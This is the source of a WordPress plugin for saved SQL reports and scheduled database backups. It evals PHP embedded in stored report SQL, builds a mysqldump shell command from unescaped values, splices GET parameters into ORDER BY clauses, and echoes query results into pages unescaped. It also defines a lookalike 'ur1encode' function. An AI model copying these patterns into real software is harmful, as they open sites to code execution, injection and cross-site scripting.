<?php
/*
Plugin Name: ELI's SQL Admin Reports Shortcode and DB Backup
Plugin URI: http://wordpress.ieonly.com/category/my-plugins/sql-reports/
Author: Eli Scheetz
Author URI: http://wordpress.ieonly.com/category/my-plugins/
Description: Create and save SQL queries, run them from the Reports tab in your Admin, place them on the Dashboard for certain User Roles, or place them on Pages and Posts using the shortcode. And keep your database safe with scheduled backups.
Version: 4.1.76
*/
define("ELISQLREPORTS_VERSION", '4.1.76');
if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) die('You are not allowed to call this page directly.<p>You could try starting <a href="/">here</a>.');
define("ELISQLREPORTS_DIR", 'ELISQLREPORTS');
/**
 * ELISQLREPORTS Main Plugin File
 * @package ELISQLREPORTS
*/
/*  Copyright 2011-2013 Eli Scheetz (email: wordpress@ieonly.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
function ELISQLREPORTS_install() {
	global $wp_version;
	if (version_compare($wp_version, "2.6", "<"))
		die("This Plugin requires WordPress version 2.6 or higher");
}
$ELISQLREPORTS_settings_array = get_option("ELISQLREPORTS_settings_array", array());
if (!(isset($ELISQLREPORTS_settings_array["default_styles"])))
	$ELISQLREPORTS_settings_array["default_styles"] = "overflow: auto;";
$ELISQLREPORTS_reports_array = get_option("ELISQLREPORTS_reports_array", array());
$ELISQLREPORTS_reports_keys = array();
foreach (array_keys($ELISQLREPORTS_reports_array) as $ELISQLREPORTS_reports_key)
	$ELISQLREPORTS_reports_keys[sanitize_title($ELISQLREPORTS_reports_key)] = $ELISQLREPORTS_reports_key;
$encode = '/[\?\-a-z\: \.\=\/A-Z\&\_]/';
function ELISQLREPORTS_display_header($pTitle, $optional_box = array()) {
	global $ELISQLREPORTS_boxes;
	echo '<script>
function showhide(id) {
	divx = document.getElementById(id);
	if (divx.style.display == "none" || arguments[1])
		divx.style.display = "block";
	else
		divx.style.display = "none";
}
</script>
<h1 id="top_title">'.$pTitle.'</h1>
<form method="POST" name="SQLForm" id="SQLForm" action="'.str_replace('&amp;','&', htmlspecialchars( $_SERVER['REQUEST_URI'] , ENT_QUOTES ) ).'">
<div id="right-sidebar" class="metabox-holder">';
	if (is_array($optional_box))
		foreach ($optional_box as $box)
			echo '<div id="'.sanitize_title($box).'" class="shadowed-box stuffbox"><h3 class="hndle"><span>'."$box</span></h3>\n<div class='inside'>$ELISQLREPORTS_boxes[$box]</div></div>\n";
	else
		echo $optional_box;
	echo '
</div>
<div id="admin-page-container">
	<div id="main-section" class="metabox-holder">';
}
function ELISQLREPORTS_set_backupdir() {
	global $ELISQLREPORTS_settings_array;
	$err403 = "<html>\n<head>\n<title>403 Forbidden</title>\n</head>\n<body>\n<h1>Forbidden</h1>\n<p>You don't have permission to access this directory.</p>\n</body>\n</html>";
	if (!(isset($ELISQLREPORTS_settings_array["backup_dir"]) && strlen($ELISQLREPORTS_settings_array["backup_dir"]) && is_dir($ELISQLREPORTS_settings_array["backup_dir"]))) {
		$upload = wp_upload_dir();
		$ELISQLREPORTS_settings_array["backup_dir"] = trailingslashit($upload["basedir"]).'SQL_Backups';
		if (!is_dir($ELISQLREPORTS_settings_array["backup_dir"]) && !mkdir($ELISQLREPORTS_settings_array["backup_dir"]))
			$ELISQLREPORTS_settings_array["backup_dir"] = $upload["basedir"];
		if (!is_file(trailingslashit($upload["basedir"]).'index.php'))
			@file_put_contents(trailingslashit($upload["basedir"]).'index.php', $err403);
	}
	if (!is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).'.htaccess'))
		@file_put_contents(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).'.htaccess', "Options -Indexes");
	if (!is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).'index.php'))
		@file_put_contents(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).'index.php', $err403);
}
$ELISQLREPORTS_backup_file = false;
function ELISQLREPORTS_make_Backup($date_format, $backup_type = "manual", $db_name = DB_NAME, $db_host = DB_HOST, $db_user = DB_USER, $db_password = DB_PASSWORD) {
	global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_backup_file, $wpdb;
	if (mysql_connect($db_host, $db_user, $db_password)) {
		if (mysql_select_db($db_name)) {
			ELISQLREPORTS_set_backupdir();
			$db_date = date($date_format);
			if (strpos($db_host, ':')) {
				list($db_host, $db_port) = explode(':', $db_host, 2);
				if (is_numeric($db_port))
					$db_port = '" --port="'.$db_port.'" ';
				else
					$db_port = '" --socket="'.$db_port.'" ';
			} else
				$db_port = '" ';
			$subject = "$backup_type.$db_name.$db_host.sql";
			$filename = "z.$db_date.$subject";
			$backup_file = trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$filename;
			$content = '';
			$uid = md5(time());
			$message = "\r\n--$uid\r\nContent-type: text/html; charset=\"iso-8859-1\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n";
			if (isset($ELISQLREPORTS_settings_array["backup_method"]) && $ELISQLREPORTS_settings_array["backup_method"]) {
				$mysqlbasedir = $wpdb->get_row("SHOW VARIABLES LIKE 'basedir'");
				if(substr(PHP_OS,0,3) == 'WIN')
					$backup_command = '"'.(isset($mysqlbasedir->Value)?trailingslashit(str_replace('\\', '/', $mysqlbasedir->Value)).'bin/':'').'mysqldump.exe"';
				else
					$backup_command = (isset($mysqlbasedir->Value)&&is_file(trailingslashit($mysqlbasedir->Value).'bin/mysqldump')?trailingslashit($mysqlbasedir->Value).'bin/':'').'mysqldump';		
				$backup_command .= ' --user="'.$db_user.'" --password="'.$db_password.'" --add-drop-table --skip-lock-tables --host="'.$db_host.$db_port.$db_name;
				if (isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]) {
					$backup_command .= ' | gzip > ';
					$backup_file .= '.gz';
				} else
					$backup_command .= ' -r ';
				passthru($backup_command.'"'.$backup_file.'"', $errors);
				$return = "Command Line Backup of $subject returned $errors error".($error!=1?'s':'');
			} elseif ($ELISQLREPORTS_backup_file = fopen($backup_file, 'w')) {
				fwrite($ELISQLREPORTS_backup_file, '/* Backup of $db_name on $db_host at $db_date */
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE=\'+00:00\' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=\'NO_AUTO_VALUE_ON_ZERO\' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
');
				$sql = "show full tables where Table_Type = 'BASE TABLE'";
				$result = mysql_query($sql);
				$errors = "";
				if (mysql_errno())
					$errors .= "/* SQL ERROR: ".mysql_error()." */\n\n/*$sql*/\n\n";
				else {
					while ($row = mysql_fetch_row($result)) {
						$errors .= ELISQLREPORTS_get_structure($row[0]);
						if (!is_numeric($rows = ELISQLREPORTS_get_data($row[0])))
							$errors .= $rows;
					}
					mysql_free_result($result);
					$sql = "show full tables where Table_Type = 'VIEW'";
					if ($result = mysql_query($sql)) {
						while ($row = mysql_fetch_row($result))
							$errors .= ELISQLREPORTS_get_structure($row[0], "View");
						mysql_free_result($result);
					}
				}
				fclose($ELISQLREPORTS_backup_file);
				$return = "Backup: $subject Saved";
				$message .= "A database backup was saved on <a href='".trailingslashit(get_option("siteurl"))."wp-admin/admin.php?page=ELISQLREPORTS-settings'>".(get_option("blogname"))."</a>.\r\n<p><pre>$errors</pre><p>";
				if (isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]) {
					$zip = new ZipArchive();
					if ($zip->open($backup_file.'.zip', ZIPARCHIVE::CREATE) === true) {
						$zip->addFile($backup_file, $filename);
						$zip->close();
					}
					if (is_file($backup_file) && is_file($backup_file).'.zip') {
						if (@unlink($backup_file))
							$backup_file .= '.zip';
					} else
						$return .= " but not Zipped";
				}
			} else
				$return = "Failed to save backup!";
			if (isset($ELISQLREPORTS_settings_array[$backup_type."_backup"]) && $ELISQLREPORTS_settings_array[$backup_type."_backup"] > 0) {
				$sql_files = array();
				if ($handle = opendir($ELISQLREPORTS_settings_array["backup_dir"])) {
					while (false !== ($entry = readdir($handle)))
						if (is_file(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).$entry))
							if (strpos($entry, $subject))
								$sql_files[] = "$entry";
					closedir($handle);
					rsort($sql_files);
				}
				$del=0;
				while (count($sql_files)>$ELISQLREPORTS_settings_array[$backup_type."_backup"])
					if (@unlink(trailingslashit($ELISQLREPORTS_settings_array["backup_dir"]).array_pop($sql_files)))
						$del++;
				$message .= "\r\nNumber of archives:<li>Deleted: $del</li><li>Kept: ".count($sql_files)."</li><p>";
			}
			if (strlen($ELISQLREPORTS_settings_array["backup_email"])) {
				$headers = 'From: '.get_option("admin_email")."\r\n";
				$headers .= "MIME-Version: 1.0\r\n";
				$headers .= "Content-Type: multipart/mixed; boundary=\"$uid\"\r\n";
				$upload = wp_upload_dir();
				if (file_exists($backup_file)) {
					$file_size = filesize($backup_file);
					$handle = fopen($backup_file, "rb");
					$content .= "The backup has been attached to this email for your convenience.\r\n\r\n--$uid\r\nContent-Type: application/octet-stream; name=\"".basename($backup_file)."\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"".basename($backup_file)."\"\r\n\r\n".chunk_split(base64_encode(fread($handle, $file_size)), 70, "\r\n");
					fclose($handle);
				}
				if (mail($ELISQLREPORTS_settings_array["backup_email"], $return, $message.$content."\r\n\r\n--$uid--", $headers))
					$return .= " and Sent!";
				else
					mail($ELISQLREPORTS_settings_array["backup_email"], $return, $message.strlen($content)." bytes is too large to attach but you can download it <a href='".admin_url("admin.php?page=ELISQLREPORTS-settings&Download_SQL_Backup=".basename($backup_file))."'>here</a>.\r\n\r\n--$uid--", $headers);
			}
		} else
			$return = 'Database Selection ERROR: '.mysql_error();
	} else
		$return = 'Database Connection ERROR: '.mysql_error();
	return $return;
}
function ELISQLREPORTS_get_structure($table, $type='Table') {
	global $ELISQLREPORTS_backup_file;
	fwrite($ELISQLREPORTS_backup_file, "/* $type structure for `$table` */\n\n");
	$sql = "SHOW CREATE $type `$table`; ";
	if ($result = mysql_query($sql)) {
		fwrite($ELISQLREPORTS_backup_file, "DROP $type IF EXISTS `$table`;\n\n");
		if ($row = mysql_fetch_assoc($result))
			fwrite($ELISQLREPORTS_backup_file, preg_replace('/CREATE .+? VIEW/', 'CREATE VIEW', $row["Create $type"]).";\n\n");
		mysql_free_result($result);
	} else
		return "/* requires the SHOW VIEW privilege and the SELECT privilege */\n\n";
	return '';
}
function ELISQLREPORTS_get_data($table) {
	global $ELISQLREPORTS_backup_file;
	$sql = "SELECT * FROM `$table`;";
	if ($result = mysql_query($sql)) {
		$num_rows = mysql_num_rows($result);
		$num_fields = mysql_num_fields($result);
		$return = 0;
		if ($num_rows > 0) {
			fwrite($ELISQLREPORTS_backup_file, "/* Table data for `$table` */\n\n");
			$field_type = array();
			$i = 0;
			$field_list = " (";
			while ($i < $num_fields) {
				$meta = mysql_fetch_field($result, $i);
				array_push($field_type, $meta->type);
				$field_list .= ($i?', ':'')."`$meta->name`";
				$i++;
			}
			$field_list .= ")";
			$maxInsertSize = 100000;
			$statementSql = '';
			for ($index = 0; $row = mysql_fetch_row($result); $index++) {
				$return++;
				if (strlen($statementSql) > $maxInsertSize) {
					fwrite($ELISQLREPORTS_backup_file, $statementSql.";\n\n");
					$statementSql = "";
				}
				if (strlen($statementSql) == 0)
					$statementSql = "INSERT INTO `$table`$field_list VALUES\n";
				else
					$statementSql .= ",\n";
				$statementSql .= "(";
				for ($i = 0; $i < $num_fields; $i++) {
					if (is_null($row[$i]))
						$statementSql .= "null";
					else {
						if ($field_type[$i] == 'int')
							$statementSql .= $row[$i];
						else
							$statementSql .= "'" . mysql_real_escape_string($row[$i]) . "'";
					}
					if ($i < $num_fields - 1)
						$statementSql .= ",";
				}
				$statementSql .= ")";
			}
			if ($statementSql)
				fwrite($ELISQLREPORTS_backup_file, $statementSql.";\n\n");
		}
		mysql_free_result($result);
	} else
		$return = "SELECT ERROR for `$table`: ".mysql_error()."\n";
	return $return;
}
if (!function_exists('ur1encode')) { function ur1encode($url) {
	global $encode;
	return preg_replace($encode, '\'%\'.substr(\'00\'.strtoupper(dechex(ord(\'\0\'))),-2);', $url);
}}
function ELISQLREPORTS_view_report($Report_Name = '', $MySQL = '') {
	global $ELISQLREPORTS_Report_SQL, $current_user, $ELISQLREPORTS_reports_keys, $ELISQLREPORTS_reports_array, $ELISQLREPORTS_query_times, $ELISQLREPORTS_settings_array;
	if ($Report_Name == '')
		$Report_Name = 'Unsaved Report';
	elseif ($MySQL == '') {
		if (isset($ELISQLREPORTS_reports_array[$Report_Name]))
			$MySQL = ($ELISQLREPORTS_reports_array[$Report_Name]);
		elseif (isset($ELISQLREPORTS_reports_array[$ELISQLREPORTS_reports_keys[$Report_Name]])) {
			$Report_Name = $ELISQLREPORTS_reports_keys[$Report_Name];
			$MySQL = ($ELISQLREPORTS_reports_array[$Report_Name]);
		} else
			$MySQL = $ELISQLREPORTS_Report_SQL;
	}
	$report = '<div id="'.sanitize_title($Report_Name).'" class="ELISQLREPORTS-Report-DIV" style="'.$ELISQLREPORTS_settings_array["default_styles"].'"><h2 class="ELISQLREPORTS-Report-Name">'.$Report_Name.'</h2>';
	if (is_admin()) {
		if (isset($_GET["SQL_ORDER_BY"]) && is_array($_GET["SQL_ORDER_BY"])) {
			foreach ($_GET["SQL_ORDER_BY"] as $_GET_SQL_ORDER_BY) {
				if (strlen(trim(str_replace("`", '', $_GET_SQL_ORDER_BY)))>0) {
					$_GET_SQL_ORDER_BY = trim(str_replace("`", '', $_GET_SQL_ORDER_BY));
					if ($pos = strripos($MySQL, " ORDER BY "))
						$MySQL = substr($MySQL, 0, $pos + 10)."`".($_GET_SQL_ORDER_BY)."`, ".substr($MySQL, $pos + 10);
					elseif ($pos = strripos($MySQL, " LIMIT "))
						$MySQL = substr($MySQL, 0, $pos)." ORDER BY `".($_GET_SQL_ORDER_BY)."`".substr($MySQL, $pos);
					else
						$MySQL .= " ORDER BY `".($_GET_SQL_ORDER_BY)."`";
				}
			}
		}
	}
	$SQLkey = ELISQLREPORTS_eval($MySQL);
	if ($ELISQLREPORTS_query_times[$SQLkey]["rows"] && $ELISQLREPORTS_query_times[$SQLkey]["result"] && is_array($ELISQLREPORTS_query_times[$SQLkey]["result"]) && count($ELISQLREPORTS_query_times[$SQLkey]["result"]) == $ELISQLREPORTS_query_times[$SQLkey]["rows"]) {
		$report .= '<table border=1 cellspacing=0 cellpadding=4 class="ELISQLREPORTS-table"><thead><tr class="ELISQLREPORTS-Header-Row">';
		foreach (array_keys($ELISQLREPORTS_query_times[$SQLkey]["result"][0]) as $field) {
			if ($Report_Name == 'Unsaved Report')
				$report .= '<th><b><a href="javascript: document.SQLForm.submit();" onclick="document.SQLForm.action+=\'&SQL_ORDER_BY[]='.$field.'\'">'.$field.'</a></b></th>';
			else
				$report .= '<th><b>'.$field.'</b></th>';
		}
		$OddEven=array('Even','Odd');
		$report .= '</tr></thead><tbody>';
		for ($row=0; $row<count($ELISQLREPORTS_query_times[$SQLkey]["result"]); $row++) {
			$report .= '<tr class="ELISQLREPORTS-Row-'.$row.' ELISQLREPORTS-'.($OddEven[$row%2]).'-Row">';
			foreach ($ELISQLREPORTS_query_times[$SQLkey]["result"][$row] as $value)
				$report .= '<td>'.($value).'</td>';//is_array(maybe_unserialize($value))?print_r(maybe_unserialize($value),1):
			$report .= '</tr>';
		}
		$report .= '</tbody></table>';
	} elseif ($ELISQLREPORTS_query_times[$SQLkey]["errors"])
		foreach ($ELISQLREPORTS_query_times[$SQLkey]["errors"] as $error)
			$report .= '<div class="error"><ul><li>Error: '.(is_admin()?$error:'Query failed!').'</li></ul></div>';
	elseif ($ELISQLREPORTS_query_times[$SQLkey]["rows"])
		$report .= '<div class="updated"><ul><li>Query affected '.$ELISQLREPORTS_query_times[$SQLkey]["rows"].' rows!</li></ul></div>'.print_r(array("<pre>",$ELISQLREPORTS_query_times[$SQLkey]["result"],"</pre>"), 1);
	else
		$report .= '<li>No Results!</li>';
	return $report.'</div>';
}
$ELISQLREPORTS_query_times = array();
function ELISQLREPORTS_eval($SQL) {
	global $current_user, $wpdb, $ELISQLREPORTS_query_times;
	$SQLkey = md5($SQL);
	if (!isset($ELISQLREPORTS_query_times[$SQLkey])) {
		$ELISQLREPORTS_query_times[$SQLkey] = array("time" => microtime(true), "sql" => $SQL, "result" => false, "rows" => 0, "errors" => array());
		foreach (preg_split('/[\s]*[;]+[\r\n]+[;\s]*/', trim($SQL).";\n") as $SQ) {
			if (strlen($SQ)) {
				$found = array();
				if ($num = @preg_match_all('/<\?php[\s]*(.+?)[\s]*\?>/i', $SQ, $found)) {
					if (isset($found[1]) && is_array($found[1]) && count($found[1])) {
						foreach ($found[1] as $php_code)
							eval("\$found[2][] = $php_code;");
						$SQ = $wpdb->prepare(preg_replace('/<\?php[\s]*(.+?)[\s]*\?>/i', '%s', $SQ), $found[2]);
					}
				}
				if (strtoupper(substr($SQ, 0, 7)) == "SELECT " || strtoupper(substr($SQ, 0, 5)) == "SHOW ") {
					$ELISQLREPORTS_query_times[$SQLkey]["result"] = $wpdb->get_results($SQ, ARRAY_A);
					$ELISQLREPORTS_query_times[$SQLkey]["rows"] = $wpdb->num_rows;
					if ($wpdb->last_error)
						$ELISQLREPORTS_query_times[$SQLkey]["errors"][] = $wpdb->last_error;
				} elseif ($SQ) {
					$ELISQLREPORTS_query_times[$SQLkey]["rows"] = $wpdb->query($SQ);
					if (strtoupper(substr($SQ, 0, 7)) == "INSERT ")
						$ELISQLREPORTS_query_times[$SQLkey]["result"] = $wpdb->insert_id;
					if (strtoupper(substr($SQ, 0, 7)) == "UPDATE ")
						$ELISQLREPORTS_query_times[$SQLkey]["result"] = 0;
					if ($wpdb->last_error)
						$ELISQLREPORTS_query_times[$SQLkey]["errors"][] = $wpdb->last_error;
				}
			}
		}
		$ELISQLREPORTS_query_times[$SQLkey]["time"] = microtime(true) - $ELISQLREPORTS_query_times[$SQLkey]["time"];
	}
	return $SQLkey;
}
function ELISQLREPORTS_dashboard_report_roles($Report_Name) {
	global $ELISQLREPORTS_settings_array, $wp_roles;
	if (!isset($ELISQLREPORTS_settings_array["dashboard_reports"][$Report_Name]))
		$report_roles = array();
	elseif (is_array($ELISQLREPORTS_settings_array["dashboard_reports"][$Report_Name]))
		$report_roles = $ELISQLREPORTS_settings_array["dashboard_reports"][$Report_Name];
	else
		if ($ELISQLREPORTS_settings_array["dashboard_reports"][$Report_Name] == 1)
			$report_roles = array_keys($wp_roles->roles);
		else
			$report_roles = array($ELISQLREPORTS_settings_array["dashboard_reports"][$Report_Name]);
	return $report_roles;
}
function ELISQLREPORTS_report_form($Report_Name = '', $Report_SQL = '') {
	global $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $ELISQLREPORTS_query_times, $wp_roles;
	if (strlen(trim($ELISQLREPORTS_Report_SQL))>0)
		$Report_SQL = trim($ELISQLREPORTS_Report_SQL);
	$SQLkey = ELISQLREPORTS_eval($Report_SQL);
	$optional_box = '<div id="SQLFormSaveFrom"><div style="float: left; width: 256px;">';
	if (isset($wp_roles->roles) && is_array($wp_roles->roles) && strlen($Report_Name)) {
		$selectedRoles = ELISQLREPORTS_dashboard_report_roles($Report_Name);
		$optional_box .= 'Display report on dashboard for:<br /><select name="ELISQLREPORTS_dashboard_reports[]" onchange="setButtonValue(\'Save Changes\');" multiple size="'.count($wp_roles->roles).'">';
		foreach ($wp_roles->roles as $roleKey => $role)
			$optional_box .= '<option value="'.$roleKey.'"'.(in_array($roleKey, $selectedRoles)?' selected':'').'>'.$role["name"]."</option>\n";
		$optional_box .= "</select>\n";
	}
	$optional_box .= '<input style="float: right;" id="gobutton" type="submit" class="button-primary" value="'.(strlen($Report_Name)?'Save Report" /><br style="clear: right;" />Shortcode:<br />[SQLREPORT name="'.sanitize_title($Report_Name).'"]<br />':'Test SQL" /><br style="clear: right;" />').'<br /></div><div style="float: left; width: 256px;">Report Name:<br /><input style="width: 100%;" type="text" id="reportName" name="rName" value="'.htmlspecialchars($Report_Name).'" onchange="setButtonValue(\'Save Report\');" onkeyup="setButtonValue(\'Save Report\');" /><br /></div><br style="clear: left;" /></div>';
	echo '<div id="SQLFormEdit">Type or Paste your SQL into this box and give your report a name<br />
	<textarea width="100%" style="width: 100%;" rows="10" name="rSQL" class="shadowed-box" onchange="setButtonValue(\'Update Report\');" onkeyup="setButtonValue(\'Update Report\');">'.htmlspecialchars($Report_SQL).'</textarea><br />'.$optional_box.'<br /></div></form>
<script>
function moveForm() {
	rN = document.getElementById("SQLFormSaveTo");
	if (rN && document.getElementById("SQLFormSaveFrom").innerHTML) {
		rN.innerHTML = document.getElementById("SQLFormSaveFrom").innerHTML;
		document.getElementById("SQLFormSaveFrom").innerHTML = "";
	}
}
'.(strlen($Report_Name)?"showhide('SQLFormEdit');":"showhide('SQLFormDel');").'
'.($ELISQLREPORTS_query_times[$SQLkey]["errors"]?"showhide('SQLFormEdit', true);\n":"").'moveForm();
var oldName="'.str_replace("\"", "\\\"", str_replace('\\', '\\\\', $Report_Name)).'";
function setButtonValue(newval) {
	rN = document.getElementById(\'reportName\').value;
	if (oldName.length > 0) {
		if (rN.length > 0 && rN != oldName)
			newval = newval + " As";
	} else {
		if (rN.length > 0)
			newval = "Save Report";
		else
			newval = "Test SQL";
	}
	document.getElementById(\'gobutton\').value = newval;
}
</script>';
	if (isset($ELISQLREPORTS_query_times[$SQLkey]["result"]) && $ELISQLREPORTS_query_times[$SQLkey]["result"] === 0 && isset($ELISQLREPORTS_query_times[$SQLkey]["rows"]) && $ELISQLREPORTS_query_times[$SQLkey]["rows"])
		$Report_SQL = preg_replace('/^UPDATE (.+?) SET (.+?) WHERE /i', 'SELECT * FROM \\1 WHERE ', $Report_SQL);
	elseif (isset($ELISQLREPORTS_query_times[$SQLkey]["time"]) && isset($ELISQLREPORTS_query_times[$SQLkey]["rows"]) && $ELISQLREPORTS_query_times[$SQLkey]["rows"])
		echo 'Query returned '.$ELISQLREPORTS_query_times[$SQLkey]["rows"].' rows in '.substr($ELISQLREPORTS_query_times[$SQLkey]["time"], 0, 6).' seconds.<br /><br />';
	return $Report_SQL;
}
function ELISQLREPORTS_default_report($Report_Name = '') {
	global $ELISQLREPORTS_reports_array, $ELISQLREPORTS_query_times;
	if (current_user_can('activate_plugins')) {
		$ELISQLREPORTS_reports_array = get_option('ELISQLREPORTS_reports_array');
		if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array) && isset($ELISQLREPORTS_reports_array[$Report_Name])) {
			ELISQLREPORTS_display_header($Report_Name, array("Edit Report"));
			/*if (!(strlen($Report_Name) > 0 && isset($ELISQLREPORTS_reports_array[$Report_Name]))) {
				$Report_Names = array_keys($ELISQLREPORTS_reports_array);
				$Report_Name = $Report_Names[count($Report_Names)-1];
			}*/
			$MySQL = ($ELISQLREPORTS_reports_array[$Report_Name]);
			$MySQL = ELISQLREPORTS_report_form($Report_Name, $MySQL);
			echo ELISQLREPORTS_view_report($Report_Name, $MySQL);
		} else
			ELISQLREPORTS_create_report();
	} else
		echo ELISQLREPORTS_view_report($Report_Name);
	echo '<br style="clear: both;">';
	if (isset($_GET["debug"]) && is_admin())
		print_r(array("<pre>", $ELISQLREPORTS_query_times, "</pre>"));
	echo '</div></div>';
}
function ELISQLREPORTS_create_report() {
	global $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $wpdb;
	ELISQLREPORTS_display_header('Create SQL Report', array("Edit Report", "Plugin Updates", "Plugin Links"));
	$ELISQLREPORTS_reports_array = get_option('ELISQLREPORTS_reports_array', array());
	if (strlen(trim($ELISQLREPORTS_Report_SQL))==0) {
		$ELISQLREPORTS_Report_SQL = "SELECT CONCAT('<a href=\"javascript:void(0);\" onclick=\"document.SQLForm.rSQL.value=\\'SHOW FIELDS FROM `',TABLE_NAME,'`\\';\">',TABLE_NAME,'</a>') AS `SCHEMA`, CONCAT('<a href=\"javascript:void(0);\" onclick=\"document.SQLForm.rSQL.value=\\'SELECT * FROM `',TABLE_NAME,'`\\';\">',TABLE_ROWS,'</a>') AS `ROWS`, CONCAT(ROUND((DATA_LENGTH + INDEX_LENGTH) / 1024, 1), 'K') AS `SIZE` FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '".DB_NAME."'";
		$Report_Name = '<font color="red">Table List</font>';
	}
	$end = ELISQLREPORTS_view_report($Report_Name, $ELISQLREPORTS_Report_SQL);
	$Report_Name = '';
	ELISQLREPORTS_report_form($Report_Name, $ELISQLREPORTS_Report_SQL);
	echo $end.'</div></div>';
}
function ELISQLREPORTS_settings() {
	global $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $wpdb;
	ELISQLREPORTS_display_header('SQL Reports - Plugin Settings', array("Save Settings", "Plugin Updates", "Plugin Links", "Saved Reports"));
	echo '<div class="stuffbox shadowed-box">
	<h3 class="hndle"><span>SQL Report Options</span></h3>
	<div class="inside" style="margin: 10px;"><div style="float: left; margin: 5px;">Default Styles for Report DIV:<br /><textarea name="ELISQLREPORTS_default_styles"cols=30 rows=2>'.$ELISQLREPORTS_settings_array["default_styles"].'</textarea></div><div style="float: left; margin: 5px;">Place <b>SQL Reports</b> Menu Item:<br />';
	foreach (array("above <b>Appearance</b>", "below <b>Settings</b>") as $mg => $menu_group)
		echo '<div style="padding: 4px 24px;" id="menu_group_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_group" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_group"]==$mg||$mg==0?' checked':'').' />'.$menu_group.'</div>';
	echo '</div><div style="float: left; margin: 5px;">Sort <b>Saved Reports</b> by:<br />';
	foreach (array("Date Created", "Alphabetical") as $mg => $menu_sort)
		echo '<div style="padding: 4px 24px;" id="menu_sort_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_sort" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_sort"]==$mg||$mg==0?' checked':'').' />'.$menu_sort.'</div>';
	echo '</div><br style="clear: left;"></div></div>
	<div id="backuprestore" class="shadowed-box stuffbox"><h3 class="hndle"><span>Database Backup Option</span></h3><div class="inside" style="margin: 10px;"><form method=post><table width="100%" border=0><tr><td width="1%" valign="top">Backup&nbsp;Method:</td><td width="99%">';
	foreach (array("MySQL Queries (PHP calls)", "Command Line Dump (passthru -> mysqldump)") as $mg => $backup_method)
		echo '<div style="float: left; padding: 0 24px 8px 0;"><input type="radio" name="ELISQLREPORTS_backup_method" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["backup_method"]==$mg||$mg==0?' checked':'').' />'.$backup_method.'</div>';
	echo '<div style="float: left; padding: 0 24px 8px 0;"><input type="checkbox" name="ELISQLREPORTS_compress_backup" value="1"'.(isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]?' checked':'').' />Compress Backup Files</div></td></tr><tr><td width="1%">Save&nbsp;all&nbsp;backups&nbsp;to:</td><td width="99%"><input style="width: 100%" name="ELISQLREPORTS_backup_dir" value="'.$ELISQLREPORTS_settings_array["backup_dir"].'"></td></tr><tr><td width="1%">Email&nbsp;all&nbsp;backups&nbsp;to:</td><td width="99%"><input style="width: 100%" name="ELISQLREPORTS_backup_email" value="'.$ELISQLREPORTS_settings_array["backup_email"].'"></td></tr></table><br />Automatically make and keep <input size=1 name="ELISQLREPORTS_hourly_backup" value="'.$ELISQLREPORTS_settings_array["hourly_backup"].'"> Hourly and <input size=1 name="ELISQLREPORTS_daily_backup" value="'.$ELISQLREPORTS_settings_array["daily_backup"].'"> Daily backups.<br />';
	if ($next = wp_next_scheduled('ELISQLREPORTS_hourly_backup', array("Y-m-d-H-i-s", 'hourly')))
		echo "<li>next hourly backup: ".date("Y-m-d H:i:s", $next)." (About ".ceil(($next-time())/60)." minute".(ceil(($next-time())/60)==1?'':'s')." from now)</li>";
//	else echo md5(serialize($args)).'='.serialize($args);
	if ($next = wp_next_scheduled('ELISQLREPORTS_daily_backup', array("Y-m-d-H-i-s", 'daily')))
		echo "<li>next daily backup: ".date("Y-m-d H:i:s", $next)." (Less than ".ceil(($next-time())/60/60)." hour".(ceil(($next-time())/60/60)==1?'':'s')." from now)</li>";
	echo '</form></div></div>
	<div id="backuprestore" class="shadowed-box stuffbox"><h3 class="hndle"><span>Database Maintenance</span></h3>
		<div class="inside" style="margin: 10px;">
			<form method=post>';
	ELISQLREPORTS_set_backupdir();
